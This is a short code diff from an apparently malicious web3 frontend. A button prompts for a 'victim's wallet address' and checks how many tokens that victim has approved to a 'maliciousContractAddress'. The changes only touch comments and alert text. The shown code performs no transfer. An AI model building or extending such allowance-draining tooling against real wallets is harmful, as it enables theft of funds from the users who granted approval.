@@ -364,17 +364,19 @@ document.getElementById("checkAllowanceBtn").addEventListener("click", async () 
     const victimAddress = prompt("Enter victim's wallet address:");
     if (victimAddress) {
         try {
-            // Retrieve the allowance in Wei
+            // Retrieve the allowance in the smallest unit (Wei equivalent for tokens with 18 decimals)
             const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
-            // Convert to token units for human readability
-            const readableAllowance = web3.utils.fromWei(allowance, 'ether');
-            alert(`Allowance: ${readableAllowance} tokens granted.`);
+            
+            // Convert to token units for human readability (adjust for 18 decimals)
+            const readableAllowance = web3.utils.fromWei(allowance, 'ether');  // Still use 'ether' because we treat token amounts as 'ether' for readability with 18 decimals
+            alert(`Allowance: ${readableAllowance} stk tokens granted.`);
         } catch (error) {
             alert("Error while checking allowance.");
             console.error("Allowance Error:", error);
         }
     }
 });
+
 
 
 
